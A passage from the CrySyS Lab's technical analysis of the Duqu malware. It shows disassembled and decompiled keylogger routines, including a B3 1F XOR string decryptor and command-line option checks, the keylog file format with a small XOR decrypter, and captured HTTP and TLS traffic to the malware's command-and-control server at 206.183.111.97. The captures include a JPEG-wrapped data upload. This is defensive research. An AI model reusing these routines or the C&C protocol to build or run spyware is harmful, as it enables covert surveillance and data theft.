8\n.text:00401B96\n.text:00401B96         mov   edx, [esp+addr_ciphertext]\n.text:00401B9A         test  edx, edx\n.text:00401B9C         jnz   short loc_401BA8\n.text:00401B9E         mov   ecx, [esp+addr_target]\n.text:00401BA2         xor   eax, eax\n.text:00401BA4         mov   [ecx], ax\n.text:00401BA7         retn\n.text:00401BA8 ; --------------------------------------------------------------------------.text:00401BA8\n\n```\n.text:00401BA8 loc_401BA8:               ; CODE XREF: xorcryptor_b31f_at_401b96+6 j �\n```\n.text:00401BA8         mov   eax, [esp+addr_target]\n.text:00401BAC         push  edi\n.text:00401BAD         mov   ecx, 0B31FB31Fh\n.text:00401BB2         jmp   short loc_401BC1\n.text:00401BB4 ; --------------------------------------------------------------------------.text:00401BB4\n.text:00401BB4 loc_401BB4:               ; CODE XREF: xorcryptor_b31f_at_401b96+34 j �\n.text:00401BB4         cmp   word ptr [eax+2], 0\n.text:00401BB9         jz   short loc_401BCC\n.text:00401BBB         add   edx, 4\n.text:00401BBE         add   eax, 4\n.text:00401BC1\n.text:00401BC1 loc_401BC1:               ; CODE XREF: xorcryptor_b31f_at_401b96+1C j �\n.text:00401BC1         mov   edi, [edx]\n.text:00401BC3         xor   edi, ecx\n.text:00401BC5         mov   [eax], edi\n.text:00401BC7         test  di, di\n.text:00401BCA         jnz   short loc_401BB4 ; String is terminated by 00 characters, that stops\ndecryption\n.text:00401BCC\n.text:00401BCC loc_401BCC:               ; CODE XREF: xorcryptor_b31f_at_401b96+23 j �\n.text:00401BCC         pop   edi\n.text:00401BCD         retn\n.text:00401BCD xorcryptor_b31f_at_401b96 endp\n\n```\n**Sample 17 – B3 1F XOR encryption routine from keylogger**\n```\n 1000E4D1              L1000E4D1:\n 1000E4D1 8B442408          mov eax,[esp+08h]\n 1000E4D5 57             push edi\n 1000E4D6 B91FB31FB3         mov ecx,B31FB31Fh\n 1000E4DB EB0D            jmp L1000E4EA\n 1000E4DD              L1000E4DD:\n 1000E4DD 6683780200         cmp word ptr [eax+02h],0000h\n 1000E4E2 7411            jz  L1000E4F5\n 1000E4E4 83C204           add edx,00000004h\n 1000E4E7 83C004           add eax,00000004h\n 1000E4EA              L1000E4EA:\n 1000E4EA 8B3A            mov edi,[edx]\n 1000E4EC 33F9            xor edi,ecx\n 1000E4EE 8938            mov [eax],edi\n 1000E4F0 6685FF           test di,di\n 1000E4F3 75E8            jnz L1000E4DD\n 1000E4F5              L1000E4F5:\n 1000E4F5 5F             pop edi\n 1000E4F6 C3             retn\n\n```\n**Sample 18 – B3 1F XOR encryption routine from cmi4432.pnf**\n\nLaboratory of Cryptography and System Security (CrySyS)\nBudapest University of Technology and Economics\nwww.crysys.hu 45\n\n\n-----\n\n```\n  v9 = pNumArgs;\n if ( pNumArgs > 1 && !lstrcmpiW(*(LPCWSTR *)(commandlineparam + 4), L\"xxx\") )\n {\n  v22 = 2;\n  while ( v22 < v9 )\n  {\n   v4 = 0;\n   if ( !check_options_sub_4013AE((int)&v22, v9, commandlineparam, (int)&v14) )\n    goto LABEL_13;\n  }\n  if ( createfile_stuff((int)&v14) && tempfile_eraser((int)&v14) && sub_401160((int)&v14, (int)&Memory,\n(int)&v22) )\n  {\n   if ( sub_401269(Memory, v22) )\n   {\n    v10 = 1;\n    v4 = 0;\n    goto LABEL_14;\n   }\n   v4 = 0;\n  }\n }\nLABEL_13:\n\n```\n**Sample 19 – Keylogger – does not start if the first parameter is not “xxx”**\n```\n  v4 = *(_DWORD *)(a3 + 4 * *(_DWORD *)a1);\n if ( *(_WORD *)v4 == 47 )\n {\n  v6 = (const WCHAR *)(v4 + 2);\n  ++*(_DWORD *)a1;\n  if ( lstrcmpiW(v6, L\"delme\") )\n  {\n   if ( lstrcmpiW(v6, L\"v\") )\n   {\n    if ( lstrcmpiW(v6, L\"quit\") )\n    {\n     if ( lstrcmpiW(v6, L\"restart\") )\n     {\n      result = sub_401000(a3, a1, a4, v6, a2);\n     }\n     else\n     {\n      result = 1;\n      *(_DWORD *)(a4 + 12) = 1;\n     }\n    }\n\n```\n**Sample 20 – valid options – not tested furthermore**\n\nLaboratory of Cryptography and System Security (CrySyS)\nBudapest University of Technology and Economics\nwww.crysys.hu 46\n\n\n-----\n\n```\n signed int __userpurge sub_401000<eax>(int a1<edx>, int a2<ecx>, int a3<ebx>, LPCWSTR lpString1, int a5)\n{\n int v5; // eax@1\n int v7; // edi@3\n v5 = *(_DWORD *)a2;\n if ( *(_DWORD *)a2 >= a5 )\n  return 0;\n v7 = *(_DWORD *)(a1 + 4 * v5);\n *(_DWORD *)a2 = v5 + 1;\n if ( !lstrcmpW(lpString1, L\"in\") )\n {\n  *(_DWORD *)(a3 + 16) = v7;\n  return 1;\n }\n if ( !lstrcmpW(lpString1, L\"out\") )\n {\n  *(_DWORD *)(a3 + 32) = v7;\n  return 1;\n }\n return 0;\n}\n\n```\n**Sample 21 – and some more options**\n\nThe keylogger.exe file contains an embedded jpeg file from position 34440 (in bytes). The\npicture is only partial, the readable text shows “Interacting Galaxy System NGC 6745”, most\nlikely a picture taken from NASA and used as deception. At position 42632 an encrypted DLL\ncan be found. The encryption is simple XOR with 0xFF.\n\nThe unencrypted DLL is (as in the other cases) a compressed UPX file. According to the call\ngraph, most likely, the “outer” .exe is just a control program and injector to this internal\npart, and the internal DLL contains keylogging related function calls.\n\nLaboratory of Cryptography and System Security (CrySyS)\nBudapest University of Technology and Economics\nwww.crysys.hu 47\n\n\n-----\n\n**Figure 21 – Structure of the interal DLL of keylogger shows wide functionality**\n\nInteresting function calls: GetIPForwardTable, GetIpNetTable, GetWindowTextW,\nCreateCompatiblebitmap, GetKeyState, NetfileEnum, etc.\n\n##### 13.1.1. Keylogger file format\n\nThe keylogger stores data in the %TEMP% directory of the target computer. The file begins\nwith hex AD 34 00 and generally resides in the User/… /Appdata/Local/Temp OR Documents\n_and Settings/ …/Local data/temp directory._\n\nStrings “AEh91AY” in the file are modified bzip headers, whose parts can be decompressed\nafter extracting and modifying it back to “BZh91AY”. Note that the magic number, AE\nappears again in the code.\n\nAnother type of this binary file begins with ”ABh91AY”, which is a bzip2 compressed file\ncontaining a number of files in cleartext, like a tar file (but simpler format). The\nuncompressed file begins with string “ABSZ” and the name of the source computer.\n\nLaboratory of Cryptography and System Security (CrySyS)\nBudapest University of Technology and Economics\nwww.crysys.hu 48\n\n\n-----\n\nThe keylogger file is a variable-size record based format and it begins with 0xAD 0x34.\n```\ntypedef struct tagDQH1 {\n     unsigned char magic;\n     unsigned char type;\n     unsigned char unk1;\n     unsigned char unk2;\n     time_t ts;\n     unsigned long len;\n} DQH1;\ntypedef struct tagDQHC0 {\n     unsigned long lenu;\n     unsigned char zipm[8];\n} DQHC0;\n\n```\n**Sample 22 – header structures for keylog file**\n\nAt the beginning of each block, the file contains a tagDQH1 structure, where magic=0xAD.\nThis is valid for the beginning of the file (offset=0) as well.\n\nIf the next block is compressed (that is if the zipm (“zip magic”) part begins with\n“AEh91AY&SY” meaning that this part is a bzip2 compressed part), then tagDQHC0 block\nfollows, where lenu contains the length of the compressed part.\n\nIf the “zip magic” is missing, then the block is in a different format and the tagDQH1\ninformation can be used for length information.\n\nOtherwise, the block of the keylog file are XOR encrypted which can be decrypted by the\nfollowing routine:\n```\nfor(i=offset-1;i > 0;i--) {\nxb[i]^=xb[i-1];\n}\nxb[0]^=0xA2;\n\n```\n**Sample 23 – XOR decrypter for keylogger log files**\n\nThe contents of the parts can be different: Information on the disk drives, network shares,\nTCP table, information on running processes, names of the active window on the screen,\nscreenshots in bitmap, etc.\n\nLaboratory of Cryptography and System Security (CrySyS)\nBudapest University of Technology and Economics\nwww.crysys.hu 49\n\n\n-----\n\n### 13.2. Communication module\n\nThe discovered Duqu payload contains a Command and Control, or more precisely a\nbackdoor covert channel control communication module. (It’s goal is most likely not just\nsimple telling “commands”, but rather like RDP or VNC like functionality extended with proxy\nfunctions and file transfer or such, but this is partly just speculation.)\n\nIn our case the communication is done with 206.183.111.97, which is up and running for\nmonths and still running at the time of writing this document. The communication protocol\nuses both HTTP port 80, and HTTPS port 443. We present a first analysis with initial samples,\nbut further investigations are required to fully understand the communication protocol.\n\n##### 13.2.1. Communication protocol\n\nFor port 443, binary traffic can be observed. Among the first bytes of the traffic, we see the\ncharacters “SH” most of the time, for both sides, and multiple times the observed string is\n“53 48 b8 50 57” (SH<b8>PW).\n\nFor port 80, the traffic shows a distinct form. First, the victim computer starts the\ncommunication in the following form:\n```\nGET / HTTP/1.1\nCookie: PHPSESSID=gsc46y0u9mok0g27ji11jj1w22\nCache-Control: no-cache\nPragma: no-cache\nUser-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.2.9)\nGecko/20100824 Firefox/3.6.9 (.NET CLR 3.5.30729)\nHost: 206.183.111.97\nConnection: Keep-Alive\n\n```\n**Sample 24 – HTTP communication protocol HTTP query header**\n\nThe PHP session ID is of course fabricated and generated by the communication module. The\nUser Agent is static and as it is very specific (rarely observed in the wild), providing a\npossibility to create specific matching signature e.g. in IDS tools.\n\nThe IP address seems to be constant, and it is hard coded to the PNF file in multiple times\n(once as a UTF-8 IP string, and twice as hex binaries).\n\nLaboratory of Cryptography and System Security (CrySyS)\nBudapest University of Technology and Economics\nwww.crysys.hu 50\n\n\n-----\n\nAfter sending out the HTTP header, the server begins the answer by sending back a jpeg file\n(seems to be a 100x100 empty jpeg), most likely for deception and to avoid firewall\nproblems:\n```\n  00000000 48 54 54 50 2f 31 2e 31 20 32 30 30 20 4f 4b 0d HTTP/1.1 200 OK.\n  00000010 0a 43 6f 6e 74 65 6e 74 2d 54 79 70 65 3a 20 69 .Content -Type: i\n  00000020 6d 61 67 65 2f 6a 70 65 67 0d 0a 54 72 61 6e 73 mage/jpe g..Trans\n  00000030 66 65 72 2d 45 6e 63 6f 64 69 6e 67 3a 20 63 68 fer-Enco ding: ch\n  00000040 75 6e 6b 65 64 0d 0a 43 6f 6e 6e 65 63 74 69 6f unked..C onnectio\n  00000050 6e 3a 20 43 6c 6f 73 65 0d 0a 0d 0a       n: Close ....\n  0000005C 32 45 30 0d 0a ff d8 ff e0 00 10 4a 46 49 46 00 2E0..... ...JFIF.\n  0000006C 01 01 01 00 60 00 60 00 00 ff db 00 43 00 02 01 ....`.`. ....C...\n  0000007C 01 02 01 01 02 02 02 02 02 02 02 02 03 05 03 03 ........ ........\n  0000008C 03 03 03 06 04 04 03 05 07 06 07 07 07 06 07 07 ........ ........\n  0000009C 08 09 0b 09 08 08 0a 08 07 07 0a 0d 0a 0a 0b 0c ........ ........\n  000000AC 0c 0c 0c 07 09 0e 0f 0d 0c 0e 0b 0c 0c 0c ff db ........ ........\n  000000BC 00 43 01 02 02 02 03 03 03 06 03 03 06 0c 08 07 .C...... ........\n  000000CC 08 0c 0c 0c 0c 0c 0c 0c 0c 0c 0c 0c 0c 0c 0c 0c ........ ........\n  000000DC 0c 0c 0c 0c 0c 0c 0c 0c 0c 0c 0c 0c 0c 0c 0c 0c ........ ........\n  000000EC 0c 0c 0c 0c 0c 0c 0c 0c 0c 0c 0c 0c 0c 0c 0c 0c ........ ........\n  000000FC 0c 0c 0c ff c0 00 11 08 00 36 00 36 03 01 22 00 ........ .6.6..\".\n  0000010C 02 11 01 03 11 01 ff c4 00 1f 00 00 01 05 01 01 ........ ........\n  0000011C 01 01 01 01 00 00 00 00 00 00 00 00 01 02 03 04 ........ ........\n  0000012C 05 06 07 08 09 0a 0b ff c4 00 b5 10 00 02 01 03 ........ ........\n  0000013C 03 02 04 03 05 05 04 04 00 00 01 7d 01 02 03 00 ........ ...}....\n  0000014C 04 11 05 12 21 31 41 06 13 51 61 07 22 71 14 32 ....!1A. .Qa.\"q.2\n  0000015C 81 91 a1 08 23 42 b1 c1 15 52 d1 f0 24 33 62 72 ....#B.. .R..$3br\n  0000016C 82 09 0a 16 17 18 19 1a 25 26 27 28 29 2a 34 35 ........ %&'()*45\n  0000017C 36 37 38 39 3a 43 44 45 46 47 48 49 4a 53 54 55 6789:CDE FGHIJSTU\n  0000018C 56 57 58 59 5a 63 64 65 66 67 68 69 6a 73 74 75 VWXYZcde fghijstu\n  0000019C 76 77 78 79 7a 83 84 85 86 87 88 89 8a 92 93 94 vwxyz... ........\n  000001AC 95 96 97 98 99 9a a2 a3 a4 a5 a6 a7 a8 a9 aa b2 ........ ........\n  000001BC b3 b4 b5 b6 b7 b8 b9 ba c2 c3 c4 c5 c6 c7 c8 c9 ........ ........\n  000001CC ca d2 d3 d4 d5 d6 d7 d8 d9 da e1 e2 e3 e4 e5 e6 ........ ........\n  000001DC e7 e8 e9 ea f1 f2 f3 f4 f5 f6 f7 f8 f9 fa ff c4 ........ ........\n  000001EC 00 1f 01 00 03 01 01 01 01 01 01 01 01 01 00 00 ........ ........\n  000001FC 00 00 00 00 01 02 03 04 05 06 07 08 09 0a 0b ff ........ ........\n  0000020C c4 00 b5 11 00 02 01 02 04 04 03 04 07 05 04 04 ........ ........\n  0000021C 00 01 02 77 00 01 02 03 11 04 05 21 31 06 12 41 ...w.... ...!1..A\n  0000022C 51 07 61 71 13 22 32 81 08 14 42 91 a1 b1 c1 09 Q.aq.\"2. ..B.....\n  0000023C 23 33 52 f0 15 62 72 d1 0a 16 24 34 e1 25 f1 17 #3R..br. ..$4.%..\n  0000024C 18 19 1a 26 27 28 29 2a 35 36 37 38 39 3a 43 44 ...&'()* 56789:CD\n  0000025C 45 46 47 48 49 4a 53 54 55 56 57 58 59 5a 63 64 EFGHIJST UVWXYZcd\n  0000026C 65 66 67 68 69 6a 73 74 75 76 77 78 79 7a 82 83 efghijst uvwxyz..\n  0000027C 84 85 86 87 88 89 8a 92 93 94 95 96 97 98 99 9a ........ ........\n  0000028C a2 a3 a4 a5 a6 a7 a8 a9 aa b2 b3 b4 b5 b6 b7 b8 ........ ........\n  0000029C b9 ba c2 c3 c4 c5 c6 c7 c8 c9 ca d2 d3 d4 d5 d6 ........ ........\n  000002AC d7 d8 d9 da e2 e3 e4 e5 e6 e7 e8 e9 ea f2 f3 f4 ........ ........\n  000002BC f5 f6 f7 f8 f9 fa ff da 00 0c 03 01 00 02 11 03 ........ ........\n  000002CC 11 00 3f 00 fd fc a2 8a 28 00 a2 8a 28 00 a2 8a ..?..... (...(...\n  000002DC 28 00 a2 8a 28 00 a2 8a 28 00 a2 8a 28 00 a2 8a (...(... (...(...\n  000002EC 28 00 a2 8a 28 00 a2 8a 28 00 a2 8a 28 00 a2 8a (...(... (...(...\n  000002FC 28 00 a2 8a 28 00 a2 8a 28 00 a2 8a 28 00 a2 8a (...(... (...(...\n  0000030C 28 00 a2 8a 28 03 ff d9 53 48 c0 a7 26 7b 00 22 (...(... SH..&{.\"\n  0000031C 00 01 00 00 14 10 00 00 00 01 00 00 00 3e 96 19 ........ .....>..\n  0000032C 10 00 00 00 20 00 00 00 00 00 00 00 00 00 00 00 .... ... ........\n\n```\n**Sample 25 – beginning of the transmission from the C&C server – a JPEG + extras**\n\nLaboratory of Cryptography and System Security (CrySyS)\nBudapest University of Technology and Economics\nwww.crysys.hu 51\n\n\n-----\n\nSometimes the client sends a JPEG image in the query as well, which is always named as\nDSC00001.jpg (hard coded in the binary) as follows in the sample below.\n```\nPOST / HTTP/1.1\nCache-Control: no-cache\nConnection: Keep-Alive\nPragma: no-cache\nContent-Type: multipart/form-data; boundary=---------------------------77eb5cc2cc0add\nCookie: PHPSESSID=<some id removed here>\nUser-Agent: Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.2.9) Gecko/20100824 Firefox/3.6.9 (.NET\nCLR 3.5.30729)\nContent-Length: 891\nHost: 206.183.111.97\n---------------------------<some id>\nContent-Disposition: form-data; name=\"DSC00001.jpg\"\nContent-Type: image/jpeg\n......JFIF.....`.`.....C.........................................\n...\n.........\n.........C.......................................................................6.6..\"....................\n..................\n.....................}........!1A..Qa.\"q.2....#B...R..$3br..\n.....%&'()*456789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz.........................................................\n...............................................\n.....................w.......!1..AQ.aq.\"2...B.....#3R..br.\n.$4.%.....&'()*56789:CDEFGHIJSTUVWXYZcdefghijstuvwx\n\n```\n**Sample 26 – beginning of the transmission with JPEG upload**\n\nThe communication can be reproduced in telnet. In this case, it can be clearly seen that after\nsending back the JPEG, the other end starts to send out some binary data, and because it\nremains unanswered, the other end closes down the channel. We illustrate this emulation in\nthe following sample log.\n```\n …\n  000002CC 11 00 3f 00 fd fc a2 8a 28 00 a2 8a 28 00 a2 8a ..?..... (...(...\n  000002DC 28 00 a2 8a 28 00 a2 8a 28 00 a2 8a 28 00 a2 8a (...(... (...(...\n  000002EC 28 00 a2 8a 28 00 a2 8a 28 00 a2 8a 28 00 a2 8a (...(... (...(...\n  000002FC 28 00 a2 8a 28 00 a2 8a 28 00 a2 8a 28 00 a2 8a (...(... (...(...\n  0000030C 28 00 a2 8a 28 03 ff d9 53 48 c0 a7 26 7b 00 22 (...(... SH..&{.\"\n  0000031C 00 01 00 00 14 10 00 00 00 01 00 00 00 3e 96 19 ........ .....>..\n  0000032C 10 00 00 00 20 00 00 00 00 00 00 00 00 00 00 00 .... ... ........\n  0000033C 00 02 00 00 00 0d 0a               .......\n  00000343 31 31 0d 0a 0c 00 00 00 00 02 00 00 00 3e 96 19 11...... .....>..\n  00000353 00 00 00 00 20 0d 0a               .... ..\n  0000035A 32 31 0d 0a 14 10 00 00 00 01 00 00 00 3e 96 19 21...... .....>..\n  0000036A 10 00 00 00 20 00 00 00 00 00 00 00 00 00 00 00 .... ... ........\n  0000037A 00 02 00 00 00 0d 0a               .......\n  00000381 31 31 0d 0a 0c 00 00 00 00 02 00 00 00 3e 96 19 11...... .....>..\n  00000391 00 00 00 00 20 0d 0a               .... ..\n  00000398 32 31 0d 0a 14 10 00 00 00 01 00 00 00 3e 96 19 21...... .....>..\n  000003A8 10 00 00 00 20 00 00 00 00 00 00 00 00 00 00 00 .... ... ........\n  000003B8 00 02 00 00 00 0d 0a               .......\n  000003BF 31 31 0d 0a 0c 00 00 00 00 02 00 00 00 3e 96 19 11...... .....>..\n  000003CF 00 00 00 00 20 0d 0a               .... ..\n\n```\nLaboratory of Cryptography and System Security (CrySyS)\nBudapest University of Technology and Economics\nwww.crysys.hu 52\n\n\n-----\n\n|000003D6 32 31 0d 0a 14 10 00 00 00 01 00 00 00 3e 96 19 21...... .....>..|Col2|\n|---|---|\n|000003E6 10 00 00 00 20 00 00 00 00 00 00 00 00 00 00 00 .... ... ........ 000003F6 00 02 00 00 00 0d 0a ....... 000003FD 31 31 0d 0a 0c 00 00 00 00 02 00 00 00 3e 96 19 11...... .....>.. 0000040D 00 00 00 00 20 0d 0a .... .. 00000414 32 31 0d 0a 14 10 00 00 00 01 00 00 00 3e 96 19 21...... .....>.. 00000424 10 00 00 00 20 00 00 00 00 00 00 00 00 00 00 00 .... ... ........ 00000434 00 02 00 00 00 0d 0a .......||\n\n\n**Sample 27 – continuation of the traffic without proper client in multiple packets**\n\n##### 13.2.2. Information on the SSL connection\n\nWe don’t know too much about the traffic on SSL port yet, but it seems that both parties use\nself-signed certificates. It is possible, however, to connect to the server without client\ncertificate. The server certificate has been changed over the time, most likely it is autoregenerated in specific intervals.\n```\n $ openssl s_client -host 206.183.111.97 -port 443 -msg\nCONNECTED(00000003)\n>>> SSL 2.0 [length 0077], CLIENT-HELLO\n  01 03 01 00 4e 00 00 00 20 00 00 39 00 00 38 00\n  00 35 00 00 16 00 00 13 00 00 0a 07 00 c0 00 00\n  33 00 00 32 00 00 2f 03 00 80 00 00 05 00 00 04\n  01 00 80 00 00 15 00 00 12 00 00 09 06 00 40 00\n  00 14 00 00 11 00 00 08 00 00 06 04 00 80 00 00\n  03 02 00 80 00 00 ff d2 f0 15 f8 da cb cb ce e8\n  c9 eb 60 23 34 93 98 c5 72 8b 22 c9 9f b8 1d e4\n  96 23 4e 88 08 5e 2c\n19605:error:140790E5:SSL routines:SSL23_WRITE:ssl handshake failure:s23_lib.c:188:\n[SSL2 is not supported]\n$ openssl s_client -host 206.183.111.97 -port 443 -msg -tls1\nCONNECTED(00000003)\n>>> TLS 1.0 Handshake [length 005a], ClientHello\n  01 00 00 56 03 01 4e 91 da 29 e3 8b 9e 68 2f 4f\n  0d a8 30 ee 1c d5 fc dc cb f9 ae 33 6a 6f cb ff\n  80 6d 2a 34 5c 88 00 00 28 00 39 00 38 00 35 00\n  16 00 13 00 0a 00 33 00 32 00 2f 00 05 00 04 00\n  15 00 12 00 09 00 14 00 11 00 08 00 06 00 03 00\n  ff 02 01 00 00 04 00 23 00 00\n<<< TLS 1.0 Handshake [length 004a], ServerHello\n  02 00 00 46 03 01 4e 92 48 ab 35 d9 05 8d 47 9a\n  8e 0c 4f fd b3 64 bb 18 f5 74 2a a1 36 45 08 cd\n  e1 b7 5f d0 a2 37 20 90 1e 00 00 fb f7 cf 4e f0\n  6d 26 95 ec 69 68 fa e7 1b ca 84 1f 0b 4f fd 2c\n  b0 69 90 01 a8 a3 0e 00 2f 00\n<<< TLS 1.0 Handshake [length 0125], Certificate\n  0b 00 01 21 00 01 1e 00 01 1b 30 82 01 17 30 81\n  c2 a0 03 02 01 02 02 10 40 2b 57 d9 61 5a c5 b8\n  40 a1 04 19 e6 c0 c9 d5 30 0d 06 09 2a 86 48 86\n  f7 0d 01 01 05 05 00 30 0d 31 0b 30 09 06 03 55\n  04 03 1e 02 00 2a 30 1e 17 0d 31 30 30 31 30 31\n  31 36 30 30 30 30 5a 17 0d 32 30 30 31 30 31 31\n  36 30 30 30 30 5a 30 0d 31 0b 30 09 06 03 55 04\n  03 1e 02 00 2a 30 5c 30 0d 06 09 2a 86 48 86 f7\n  0d 01 01 01 05 00 03 4b 00 30 48 02 41 00 d1 da\n  d2 94 78 ee a2 56 96 88 14 d0 38 49 36 9e 0f 1b\n  17 71 42 7a 32 01 42 b4 17 3e 40 87 cb c1 bd 94\n  62 f6 f8 f9 42 53 34 78 a9 f9 01 50 8f 39 f0 2c\n\n```\nLaboratory of Cryptography and System Security (CrySyS)\nBudapest University of Technology and Economics\nwww.crysys.hu 53\n\n\n-----\n\n|f4 36 dd 24 74 26 86 79 11 38 94 78 81 35 02 03|Col2|\n|---|---|\n|01 00 01 30 0d 06 09 2a 86 48 86 f7 0d 01 01 05 05 00 03 41 00 5c a4 39 a8 45 98 2a a9 97 05 77 63 2b 31 d7 96 bc b4 9f 0a dd bd 25 e4 1f dd e1 be c4 3c 08 56 31 6a 3d 23 f5 dc b1 5a 78 fe 34 a6 c5 91 d0 92 f6 28 f4 d9 61 eb 1a 5a 98 44 2a a9 30 a2 46 e3 depth=0 /CN=\\x00* verify error:num=18:self signed certificate verify return:1 depth=0 /CN=\\x00* verify return:1 <<< TLS 1.0 Handshake [length 0004], ServerHelloDone 0e 00 00 00 >>> TLS 1.0 Handshake [length 0046], ClientKeyExchange 10 00 00 42 00 40 a0 a3 36 08 e6 3d 25 b0 93 06 62 15 9d 3f ad b3 9c 9b e3 ee 87 23 37 e6 d2 8a 9e d0 0f af 1d fa 04 7e 66 e8 79 c5 71 3d 13 39 eb 7b 13 17 7c 91 e1 16 14 44 59 57 df df 69 50 bc 47 32 1b 87 35 >>> TLS 1.0 ChangeCipherSpec [length 0001] 01 >>> TLS 1.0 Handshake [length 0010], Finished 14 00 00 0c 1e e5 b8 c5 25 ef 03 8a 11 6f e3 c4 <<< TLS 1.0 ChangeCipherSpec [length 0001] 01 <<< TLS 1.0 Handshake [length 0010], Finished 14 00 00 0c 46 e2 18 8a 4e 09 3d 41 45 26 c6 ba --- Certificate chain 0 s:/CN=\\x00* i:/CN=\\x00* --- Server certificate -----BEGIN CERTIFICATE----- MIIBFzCBwqADAgECAhBAK1fZYVrFuEChBBnmwMnVMA0GCSqGSIb3DQEBBQUAMA0x CzAJBgNVBAMeAgAqMB4XDTEwMDEwMTE2MDAwMFoXDTIwMDEwMTE2MDAwMFowDTEL MAkGA1UEAx4CACowXDANBgkqhkiG9w0BAQEFAANLADBIAkEA0drSlHjuolaWiBTQ OEk2ng8bF3FCejIBQrQXPkCHy8G9lGL2+PlCUzR4qfkBUI858Cz0Nt0kdCaGeRE4 lHiBNQIDAQABMA0GCSqGSIb3DQEBBQUAA0EAXKQ5qEWYKqmXBXdjKzHXlry0nwrd vSXkH93hvsQ8CFYxaj0j9dyxWnj+NKbFkdCS9ij02WHrGlqYRCqpMKJG4w== -----END CERTIFICATE----- subject=/CN=\\x00* issuer=/CN=\\x00* --- No client certificate CA names sent --- SSL handshake has read 435 bytes and written 229 bytes --- New, TLSv1/SSLv3, Cipher is AES128-SHA Server public key is 512 bit Secure Renegotiation IS NOT supported Compression: NONE Expansion: NONE SSL-Session: Protocol : TLSv1 Cipher : AES128-SHA Session-ID: 901E0000FBF7CF4EF06D2695EC6968FAE71BCA841F0B4FFD2CB0699001A8A30E Session-ID-ctx: Master-Key: CBE2283F0192B1E928DDA4E21471BA27655EBB626EC807FBE80CA284AE8BC68AFD49349750EBF7010896B1BD04050D18 Key-Arg : None Start Time: 1318181417 Timeout : 7200 (sec) Verify return code: 18 (self signed certificate) ---||\n\n\n**Sample 28 – TLS communication with the C&C server**\n\nLaboratory of Cryptography and System Security (CrySyS)\nBudapest University of Technology and Economics\nwww.crysys.hu 54\n\n\n-----\n\n```\n Certificate:\n  Data:\n    Version: 3 (0x2)\n    Serial Number:\n      40:2b:57:d9:61:5a:c5:b8:40:a1:04:19:e6:c0:c9:d5\n    Signature Algorithm: sha1WithRSAEncryption\n    Issuer: CN=\\x00*\n    Validity\n      Not Before: Jan 1 16:00:00 2010 GMT\n      Not After : Jan 1 16:00:00 2020 GMT\n    Subject: CN=\\x00*\n    Subject Public Key Info:\n      Public Key Algorithm: rsaEncryption\n      RSA Public Key: (512 bit)\n        Modulus (512 bit):\n          00:d1:da:d2:94:78:ee:a2:56:96:88:14:d0:38:49:\n          36:9e:0f:1b:17:71:42:7a:32:01:42:b4:17:3e:40:\n          87:cb:c1:bd:94:62:f6:f8:f9:42:53:34:78:a9:f9:\n          01:50:8f:39:f0:2c:f4:36:dd:24:74:26:86:79:11:\n          38:94:78:81:35\n        Exponent: 65537 (0x10001)\n  Signature Algorithm: sha1WithRSAEncryption\n    5c:a4:39:a8:45:98:2a:a9:97:05:77:63:2b:31:d7:96:bc:b4:\n    9f:0a:dd:bd:25:e4:1f:dd:e1:be:c4:3c:08:56:31:6a:3d:23:\n    f5:dc:b1:5a:78:fe:34:a6:c5:91:d0:92:f6:28:f4:d9:61:eb:\n    1a:5a:98:44:2a:a9:30:a2:46:e3\n\n```\n**Sample 29 – Server certificate details**\n```\n $ openssl s_client -host 206.183.111.97 -port 443 -msg -ssl3\nCONNECTED(00000003)\n>>> SSL 3.0 Handshake [length 0054], ClientHello\n  01 00 00 50 03 00 4e 91 da d9 df fe e2 42 d8 bb\n  6a 96 54 35 88 d3 75 87 cb a2 80 6c 83 22 32 c6\n  00 b5 53 c5 30 bb 00 00 28 00 39 00 38 00 35 00\n  16 00 13 00 0a 00 33 00 32 00 2f 00 05 00 04 00\n  15 00 12 00 09 00 14 00 11 00 08 00 06 00 03 00\n  ff 02 01 00\n<<< SSL 3.0 Handshake [length 004a], ServerHello\n  02 00 00 46 03 00 4e 92 49 5c cc e0 3b 46 4a 34\n  72 e2 51 e6 05 29 4e 13 c4 6f 58 66 bc 3d ab cd\n  d9 5a eb 24 a1 32 20 60 0e 00 00 99 82 81 bb 47\n  ab fc 23 79 06 07 7f 11 6f 0a fd b0 9a 56 03 ab\n  78 2e 6e 13 09 9e e5 00 05 00\n<<< SSL 3.0 Handshake [length 0125], Certificate\n  0b 00 01 21 00 01 1e 00 01 1b 30 82 01 17 30 81\n  c2 a0 03 02 01 02 02 10 4e f6 48 35 85 40 75 ac\n  47 41 32 d4 dc e9 d0 9c 30 0d 06 09 2a 86 48 86\n  f7 0d 01 01 05 05 00 30 0d 31 0b 30 09 06 03 55\n  04 03 1e 02 00 2a 30 1e 17 0d 31 30 30 31 30 31\n  31 36 30 30 30 30 5a 17 0d 32 30 30 31 30 31 31\n  36 30 30 30 30 5a 30 0d 31 0b 30 09 06 03 55 04\n  03 1e 02 00 2a 30 5c 30 0d 06 09 2a 86 48 86 f7\n  0d 01 01 01 05 00 03 4b 00 30 48 02 41 00 d1 da\n  d2 94 78 ee a2 56 96 88 14 d0 38 49 36 9e 0f 1b\n  17 71 42 7a 32 01 42 b4 17 3e 40 87 cb c1 bd 94\n  62 f6 f8 f9 42 53 34 78 a9 f9 01 50 8f 39 f0 2c\n  f4 36 dd 24 74 26 86 79 11 38 94 78 81 35 02 03\n  01 00 01 30 0d 06 09 2a 86 48 86 f7 0d 01 01 05\n  05 00 03 41 00 7a 26 43 86 75 49 c2 15 4e ed 5b\n  cd ed ae 24 06 56 f2 04 dd 77 b2 e1 48 05 4e 9f\n  2f a8 be 38 71 49 c9 0d b6 a0 ec 77 ea e4 a3 8c\n  ed 0b b7 7c 36 a5 71 0f d8 57 c3 94 17 dd f7 ea\n\n```\nLaboratory of Cryptography and System Security (CrySyS)\nBudapest University of Technology and Economics\nwww.crysys.hu 55\n\n\n-----\n\n|65 0d 7c 79 66|Col2|\n|---|---|\n|depth=0 /CN=\\x00* verify error:num=18:self signed certificate verify return:1 depth=0 /CN=\\x00* verify return:1 <<< SSL 3.0 Handshake [length 0004], ServerHelloDone 0e 00 00 00 >>> SSL 3.0 Handshake [length 0044], ClientKeyExchange 10 00 00 40 96 85 20 da bd 3c ea 13 d8 7d b3 86 6e 7c 9e 86 76 53 dc 59 ae 47 e8 67 99 23 68 8a 35 aa 3f 77 13 3f b0 78 a1 64 d5 fc f6 11 93 b9 0e 49 06 7f a1 